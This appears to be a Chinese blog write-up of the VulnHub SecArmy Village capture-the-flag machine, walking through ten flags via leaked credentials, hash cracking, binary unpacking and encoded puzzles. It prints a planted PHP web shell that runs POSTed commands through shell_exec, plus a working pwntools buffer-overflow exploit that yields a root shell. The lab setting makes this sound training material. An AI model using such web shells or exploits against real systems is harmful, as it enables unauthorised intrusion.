> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pa7UlqdFvjy7RI_1SBQV-g)

**0x01** Introduction  

* * *

虚拟机下载页面：https://download.vulnhub.com/secarmyvillage/SECARMY-VILLAGE-OSCP-GIVEAWAY.ova  

Description

```
WELCOME TO THE SECARMY OSCP GIVEAWAY MACHINE!,

https://secarmy.org/village/

THIS MACHINE HAS BEEN MADE AS PART OF THE SECARMY VILLAGE EVENT AND IS SPONSORED BY OUR GENEROUS SPONSOR OFFENSIVE SECURITY. YOU ARE REQUIRED TO COMPLETE 10 TASKS IN ORDER TO GET THE ROOT FLAG. MAKE SURE THAT YOU REGISTER ON https://secarmyvillage.ml/ IN ORDER TO SUBMIT THE FLAG AS WELL AS HEAD OVER TO OUR DISCORD SERVER bit.ly/joinsecarmy FOR FURTHER ASSISTANCE REGARDING THE MACHINE

Remember: You can submit your flags from 29th of October 12:00 PM IST (UTC +5:30) to 31st of October 11:59 AM IST (UTC +5:30) on https://secarmyvillage.ml/ . Registrations will close on 29th October 11:00 AM IST (UTC +5:30)

In case the IP doesn't shows up you can log into the machine using our test account credentials: cero:svos

GOODLUCK!
```

‍

**0x02 Writeup**  

#### 主机探测、端口扫描这里就省略了，每次都写显得冗余了。

#### Flag1

访问 80 端口，没有什么有价值信息，先 dirb 跑一下目录

```
---- Scanning URL: http://192.168.132.141/ ----
==> DIRECTORY: http://192.168.132.141/anon/                                                                           
+ http://192.168.132.141/index.html (CODE:200|SIZE:267)                                                               
==> DIRECTORY: http://192.168.132.141/javascript/                                                                     
+ http://192.168.132.141/server-status (CODE:403|SIZE:280)            
```

进入到 anon 目录，查看页面元素，获取到第一个用户口令，ssh 登录获取到 flag1。  

```
Welcome to the hidden directory! <br>
<br>
Here are your credentials to make your way into the machine!
<br>
<br>
<font color="white">uno:luc10r4m0n</font>
```

```
kali@kali:~$ ssh uno@192.168.132.141
The authenticity of host '192.168.132.141 (192.168.132.141)' can't be established.
ECDSA key fingerprint is SHA256:+KBxMeqxgG6NngNoJwwS2riM4d1vvmOUVunnIyNS8I8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.132.141' (ECDSA) to the list of known hosts.
uno@192.168.132.141's password: 
 ________  _______   ________  ________  ________  _____ ______       ___    ___ 
|\   ____\|\  ___ \ |\   ____\|\   __  \|\   __  \|\   _ \  _   \    |\  \  /  /|
\ \  \___|\ \   __/|\ \  \___|\ \  \|\  \ \  \|\  \ \  \\\__\ \  \   \ \  \/  / /
 \ \_____  \ \  \_|/_\ \  \    \ \   __  \ \   _  _\ \  \\|__| \  \   \ \    / / 
  \|____|\  \ \  \_|\ \ \  \____\ \  \ \  \ \  \\  \\ \  \    \ \  \   \/  /  /  
    ____\_\  \ \_______\ \_______\ \__\ \__\ \__\\ _\\ \__\    \ \__\__/  / /    
   |\_________\|_______|\|_______|\|__|\|__|\|__|\|__|\|__|     \|__|\___/ /     
   \|_________|                                                     \|___|/      
                                                                                 
                                                                                 
 ___      ___ ___  ___       ___       ________  ________  _______               
|\  \    /  /|\  \|\  \     |\  \     |\   __  \|\   ____\|\  ___ \              
\ \  \  /  / | \  \ \  \    \ \  \    \ \  \|\  \ \  \___|\ \   __/|             
 \ \  \/  / / \ \  \ \  \    \ \  \    \ \   __  \ \  \  __\ \  \_|/__           
  \ \    / /   \ \  \ \  \____\ \  \____\ \  \ \  \ \  \|\  \ \  \_|\ \          
   \ \__/ /     \ \__\ \_______\ \_______\ \__\ \__\ \_______\ \_______\         
    \|__|/       \|__|\|_______|\|_______|\|__|\|__|\|_______|\|_______|         
                                                                                 
                                                                                 
WELCOME TO THE SECARMY OSCP GIVEAWAY MACHINE!,

https://secarmy.org/village/

THIS MACHINE HAS BEEN MADE AS PART OF THE SECARMY VILLAGE 
EVENT AND IS SPONSOSRED BY OUR GENEROUS SPONSOR OFFENSIVE
SECURITY. YOU ARE REQUIRED TO COMPLETE 10 TASKS IN ORDER TO 
GET THE ROOT FLAG. MAKE SURE THAT YOU JOIN OUR DISCORD SERVER
(bit.ly/joinsecarmy) IN ORDER TO SUBMIT THE FLAG AS WELL AS 
FOR SOLVING YOUR PROBLEMS OR QUERIES...

GOODLUCK!
uno@svos:~$ ls
flag1.txt  readme.txt
uno@svos:~$ cat flag1.txt
Congratulations!
Here's your first flag segment: flag1{fb9e88}
```

#### Flag2

这里给了提示文件`readme.txt`，得到第二个用户密码。

```
uno@svos:~$ cat readme.txt 
Head over to the second user!
You surely can guess the username , the password will be:
4b3l4rd0fru705
uno@svos:~$ cat /etc/passwd|grep bin/bash
root:x:0:0:root:/root:/bin/bash
uno:x:1001:1001:,,,:/home/uno:/bin/bash
dos:x:1002:1002:,,,:/home/dos:/bin/bash
tres:x:1003:1003:,,,:/home/tres:/bin/bash
cuatro:x:1004:1004:,,,:/home/cuatro:/bin/bash
cinco:x:1005:1005:,,,:/home/cinco:/bin/bash
seis:x:1006:1006:,,,:/home/seis:/bin/bash
siete:x:1007:1007:,,,:/home/siete:/bin/bash
ocho:x:1008:1008:,,,:/home/ocho:/bin/bash
nueve:x:1009:1009:,,,:/home/nueve:/bin/bash
cero:x:1000:1000:,,,:/home/cero:/bin/bash
```

用户名为 dos，利用上述密码切换到该用户后得到提示文件 readme.txt

```
uno@svos:~$ su - dos
Password: 
dos@svos:~$ ls
1337.txt  files  readme.txt
dos@svos:~$ cat readme.txt 
You are required to find the following string inside the files folder:
a8211ac1853a1235d48829414626512a
```

在 files 目录中找到相应文件，又把我们带到 file3131.txt

```
dos@svos:~$ grep -R a8211ac1853a1235d48829414626512a ./files/
./files/file4444.txt:a8211ac1853a1235d48829414626512a
dos@svos:~$ cat files/file4444.txt 
.......
a8211ac1853a1235d48829414626512a
Look inside file3131.txt
```

在 file3131.txt 文件最后有这样一串字符

```
UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA
```

BASE64 解密第一行，发现头两个字符是 PK，于是联想到这是一个 zip 文件，于是这里写了个简单脚本将它重写为一个为 1.zip。

```
#!/usr/bin/python3
import base64

codes = '''UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
L1aozC8tUihOTc7PS1FIy0lMB7LTc1PzSqzAPKNqMyOTRCPDWi4AUEsDBBQDAAAIADOiO1Eoztrt
dAAAAIEAAAATAAAAY2hhbGxlbmdlMi90b2RvLnR4dA3KOQ7CMBQFwJ5T/I4u8hrbdCk4AUjUXp4x
IsLIS8HtSTPVbPsodT4LvUanUYff6bHd7lcKcyzLQgUN506/Ohv1+cUhYsM47hufC0WL1WdIG4WH
80xYiZiDAg8mcpZNciu0itLBCJMYtOY6eKG8SjzzcPoDUEsBAj8DFAMAAAAAM6I7UQAAAAAAAAAA
AAAAAAsAJAAAAAAAAAAQgO1BAAAAAGNoYWxsZW5nZTIvCgAgAAAAAAABABgAgMoyJN2U1gGA6WpN
3pDWAYDKMiTdlNYBUEsBAj8DFAMAAAgAFZI2UdrgtPY+AAAAQQAAABQAJAAAAAAAAAAggKSBKQAA
AGNoYWxsZW5nZTIvZmxhZzIudHh0CgAgAAAAAAABABgAAOXQa96Q1gEA5dBr3pDWAQDl0GvekNYB
UEsBAj8DFAMAAAgAM6I7USjO2u10AAAAgQAAABMAJAAAAAAAAAAggKSBmQAAAGNoYWxsZW5nZTIv
dG9kby50eHQKACAAAAAAAAEAGACAyjIk3ZTWAYDKMiTdlNYBgMoyJN2U1gFQSwUGAAAAAAMAAwAo
AQAAPgEAAAAA'''

with open('1.zip', 'wb') as f:
    for code in codes.split('\n'):
        f.write(base64.b64decode(code))
```

```
dos@svos:~$ unzip 1.zip 
Archive:  1.zip
   creating: challenge2/
  inflating: challenge2/flag2.txt    
  inflating: challenge2/todo.txt 

dos@svos:~/challenge2$ cat flag2.txt 
Congratulations!

Here's your second flag segment: flag2{624a21}
dos@svos:~/challenge2$ cat todo.txt 
Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
```

#### Flag3

直接 nc 本地 1337 端口，输入该 token，获取到第三个用户密码。

```
dos@svos:~/challenge2$ cat todo.txt 
Although its total WASTE but... here's your super secret token: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b
dos@svos:~/challenge2$ nc 127.0.0.1 1337

 Welcome to SVOS Password Recovery Facility!
 Enter the super secret token to proceed: c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b

 Here's your login credentials for the third user tres:r4f43l71n4j3r0 
dos@svos:~/challenge2$ su - tres
Password: 
tres@svos:~$ ls
a.out  flag3.txt  readme.txt  secarmy-village
tres@svos:~$ cat flag3.txt 
Congratulations! Here's your third flag segment: flag3{ac66cf}
tres@svos:~$ cat readme.txt 
A collection of conditionals has been added in the secarmy-village binary present in this folder reverse it and get the fourth user's credentials , if you have any issues with accessing the file you can head over to: https://mega.nz/file/XodTiCJD#YoLtnkxzRe_BInpX6twDn_LFQaQVnjQufFj3Hn1iEyU
```

#### Flag4

按照提示，字符串查看`secarmy-village`发现该程序被 upx 加壳，先脱壳，再字符串查看找到用户`cuatro`密码，成功获取

```
kali@kali:~$ upx -d secarmy-village 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     53496 <-     20348   38.04%   linux/amd64   secarmy-village

Unpacked 1 file.
kali@kali:~$ strings secarmy-village|grep cuatro
Here's the credentials for the fourth user cuatro:p3dr00l1v4r3z

cuatro@svos:~$ cat flag4.txt
Congratulations, here's your 4th flag segment: flag4{1d6b06}
```

#### Flag5

```
cuatro@svos:~$ cat todo.txt 
We have just created a new web page for our upcoming platform, its a photo gallery. You can check them out at /justanothergallery on the webserver.
```

按照提示，在目录 / var/www/html/justanothergallery/qr 中找到一堆二维码，很明显，信息就在这些二维码中，写了一个小脚本，用的是 pyzbar[1]，得到了用户 cinco 的密码, 得到了 flag5。

```
#!/usr/bin/python3
import pyzbar.pyzbar as pyzbar
from PIL import Image
for number in range(0,68):
    fileName = 'qr/image-{}.png'.format(number)
    img = Image.open(fileName)
    barcodes = pyzbar.decode(img)
    for barcode in barcodes:
        barcodeData = barcode.data.decode('utf-8')
        print(barcodeData)
```

```
kali@kali:~/Desktop$ python3 test.py |grep cinco
cinco:ruy70m35
cinco@svos:~$ cat flag5.txt 
Congratulations! Here's your 5th flag segment: flag5{b1e870}
```

#### Flag6

查看提示，查找 cinco 所有的文件，找到密码文件，按照 hint 提示破解得到用户`seis`密码，成功得到 flag6。

```
cinco@svos:~$ cat readme.txt 
Check for Cinco's secret place somewhere outside the house
cinco@svos:~$ find / -user cinco 2>/dev/null
/sys/fs/cgroup/systemd/user.slice/user-1005.slice/user@1005.service
/sys/fs/cgroup/systemd/user.slice/user-1005.slice/user@1005.service/cgroup.procs
......
/cincos-secrets
/cincos-secrets/shadow.bak
/cincos-secrets/hint.txt
cinco@svos:~$ cat /cincos-secrets/hint.txt 
we will, we will, ROCKYOU..!!!
cinco@svos:~$ cat /cincos-secrets/shadow.bak 
daemon:*:18380:0:99999:7:::
......
seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::

$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:Hogwarts

cinco@svos:~$ su - seis
Password: 
seis@svos:~$ cat flag6.txt 
Congratulations! Here's your 6th flag segment: flag6{779a25}
```

#### Flag7

进入提示目录

```
seis@svos:/var/www/html/shellcmsdashboard$ ls -all
total 24
drwxrwxrwx 2 root     root 4096 Nov 13 20:44 .
drwxr-xr-x 5 root     root 4096 Oct  8 17:51 ..
-rwxrwxrwx 1 root     root 1459 Oct  1 17:57 aabbzzee.php
-rwxrwxrwx 1 root     root 1546 Oct 18 15:02 index.php
-rwx-wx-wx 1 www-data root   48 Oct  8 17:54 readme9213.txt
-rwxrwxrwx 1 root     root   58 Oct  1 17:37 robots.txt
```

发现 readme9213.txt 需要 www-data 才能查看，继续查看 aabbzzee.php

```
<?php
    if(isset($_POST['comm']))
    {
        $cmd = $_POST['comm'];
        echo "<center>";
        echo shell_exec($cmd);
        echo"</center>";
    }
?>
```

利用该 php 执行命令成功读取 txt 文档信息，获取到用户 siete 密码 6u1l3rm0p3n473。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSTbKInEkFfcrkFZt3DOibLWlClCcRaExXDyq77DX1df5XfE0icB7fzL7vDyqibt0bqlgTDY9phmP13Q/640?wx_fmt=jpeg)

```
siete@svos:~$ ls
flag7.txt  hint.txt  key.txt  message.txt  mighthelp.go  password.zip
siete@svos:~$ cat flag7.txt
Congratulations!
Here's your 7th flag segment: flag7{d5c26a}
```

#### Flag8

```
siete@svos:~$ cat hint.txt 
Base 10 and Base 256 result in Base 256!
siete@svos:~$ cat key.txt 
x
siete@svos:~$ cat message.txt 
[11 29 27 25 10 21 1 0 23 10 17 12 13 8]
siete@svos:~$ cat mighthelp.go 
package main import(
        "fmt" ) func main() {
        var chars =[]byte{}
        str1 := string(chars)
        fmt.println(str1)
}
```

从提示上看，base10 和 base256 进行 and 怎么能还是 base256 了？256 在 16 进制中表示为 00，那么只能是 xor 操作了，于是这里将 key 与数组异或得到`password.zip`的解压密码`secarmyxoritup`。  

```
>>> ''.join(chr(ord('x')^key) for key in [11,29,27,25,10,21,1,0,23,10,17,12,13,8])
'secarmyxoritup'
```

得到下一个用户 ocho 的密码 m0d3570v1ll454n4，得到 flag8。

```
ocho@svos:~$ cat flag8.txt 
Congratulations!
Here's your 8th flag segment: flag8{5bcf53}
```

#### Flag9

用`wireshark`分析`keyboard.pcapng`，找到关键数据包

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSTbKInEkFfcrkFZt3DOibLWglPicDbd4tUVwatia7Dz5GZbC0UbVsRRANiboQezZbib8SZWRTWl3W5P1g/640?wx_fmt=jpeg)

导成 txt 短文，找到了关键字符 mjwfr?2b6j3a5fx/，结合短文含义，使用 Keyboard Shift Decoder[2] 进行解码，得到用户 nueve 的密码 355u4z4rc0，从而得到 flag9。

```
QWERTY is a keyboard design for Latin-script alphabets. The name comes from the order of the first six keys on the top left letter row of the keyboard. The QWERTY design is based on a layout created for the Sholes and Glidden typewriter and sold to E. Remington and Sons in 1873. Why was the QWERTY 
......
The striker lockup came when a typist quickly typed a succession of letters on the same type bars and the strikers were adjacent to each other. There was a higher possibility for the keys to become jammed. READING IS NOT IMPORTANT, HERE IS WHAT YOU WANT: "mjwfr?2b6j3a5fx/" if the sequence was not perfectly timed. The theory presents that Sholes redesigned the type bar so as to separate the most common sequences of letters: âthâ, âheâ and others from causing a jam.
......
```

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/zSNEpUdpZQSTbKInEkFfcrkFZt3DOibLWpv0m1iaAJRDjBzmx1Au4JeukC00F94gzLNkicgibfGWhVgIpE12ymCAZg/640?wx_fmt=jpeg)

```
nueve@svos:~$ cat flag9.txt 
Congratulations!
Here's your 9th flag segment: flag9{689d3e}
```

#### Flag10  

反编译用户目录下程序`orangutan`。

```
undefined8 main(void)
{
  char local_28 [24];
  long local_10;
  
  local_10 = 0;
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("hello pwner ");
  puts("pwnme if u can ;) ");
  gets(local_28);
  if (local_10 == 0xcafebabe) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh",(char **)0x0);
  }
  return 0;
}
```

可以看到可以通过 gets 修改 local_10 为 0xcafebabe 来实现获取 root shell，具体如下：

1、远程启动 orangutan

```
nueve@svos:~$ socat TCP-LISTEN:8000 EXEC:./orangutan
```

2、本地 pwn

```
kali@kali:~$ cat test.py 
from pwn import *
offset = b"A" * 24
secret= b"\xbe\xba\xfe\xca"
payload = offset + secret
io = remote('192.168.132.141', 8000)
print(io.recvline())
print(io.recvline())
io.sendline(payload)
io.interactive()
kali@kali:~$ python3 test.py 
[+] Opening connection to 192.168.132.141 on port 8000: Done
b'hello pwner \n'
b'pwnme if u can ;) \n'
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root),1009(nueve)
$ pwd
/home/nueve
$ cd /root
$ ls -all
total 76
drwx------  8 root root  4096 Oct 22 09:22 .
drwxr-xr-x 25 root root  4096 Oct 18 14:42 ..
-rw-r--r--  1 root root  3106 Apr  9  2018 .bashrc
drwx------  4 root root  4096 Oct  7 14:09 .cache
drwx------  2 root root  4096 Sep 25 11:48 .elinks
drwxr-xr-x  3 root root  4096 Oct  5 08:39 .gem
drwx------  3 root root  4096 Oct  7 14:09 .gnupg
drwxr-xr-x  3 root root  4096 Sep 22 11:21 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxrwxr-x  1 tres tres    73 Sep 27 14:23 pw.sh
-rw-r--r--  1 root root   200 Oct 20 17:48 root.txt
-rw-r--r--  1 root root    66 Sep 27 14:31 .selected_editor
drwx------  2 root root  4096 Sep 22 11:19 .ssh
-rwxr-xr-x  1 root root 18792 Oct 21 17:49 svos_password_recovery
-rw-------  1 root root  1250 Oct  7 14:31 .viminfo
$ cat root.txt
Congratulations!!!

You have finally completed the SECARMY OSCP Giveaway Machine

Here's your final flag segment: flag10{33c9661bfd}

Head over to https://secarmyvillage.ml/ for submitting the flags!
```

**PS：大哥还是一如既往的 NB，向大哥学习！！！**  

更多精彩

*   [Web 渗透技术初级课程介绍](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486030&idx=2&sn=185f303a2f1b5267c0865f117931959d&chksm=fcfc3718cb8bbe0e6f3ca97859e78342852537da2bef3cd76a83cb90ee64a8ca8953b35aa67e&scene=21#wechat_redirect)
    
*   [](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486968&idx=1&sn=7f66208298cf2cec57286947ddb8b223&chksm=fcfc30aecb8bb9b8333c1d05976dbdbf33d34f2a0d2b0cdfc41e835d29b9b4bcfc352504f8e4&scene=21#wechat_redirect)[vulnhub 之 KIOPTRIX: LEVEL 1.3 (#4) 靶场 writeup](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247487021&idx=1&sn=778b332aea5754ca1bf4d6523aaaedad&chksm=fcfc337bcb8bba6d3c00ada8ed725ee5e9e90499d2afb0e54f24bb17456bdb08beab5374188b&scene=21#wechat_redirect)  
    
*   [商务合作](http://mp.weixin.qq.com/s?__biz=MzU2OTUxOTE2MQ==&mid=2247486808&idx=1&sn=f50f15f9a3ab7312a08b1f932292faca&chksm=fcfc300ecb8bb918213c6070d864ffcd70ad27ab6525521c31e9ccaa57bdfa2968360ed7e8fe&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/zSNEpUdpZQSd9wDlUiar0tUpHCYAzrZfTzOvS2SEw9cia9j7d1HKP2bWArPLCegs1XoejVUPu0GkSuZh7Wia7aExA/640?wx_fmt=png)

**如果感觉文章不错，分享让更多的人知道吧！**